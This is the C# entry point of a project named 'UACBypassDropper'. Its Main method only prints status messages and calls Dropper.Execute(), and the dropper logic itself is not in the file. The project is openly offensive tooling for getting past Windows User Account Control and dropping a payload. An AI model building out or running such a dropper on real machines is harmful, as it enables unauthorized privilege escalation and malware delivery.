using System;

namespace UACBypassDropper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] Starting UAC Bypass Dropper...");
            try
            {
                Dropper.Execute();
                Console.WriteLine("[+] Done!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }
    }
}
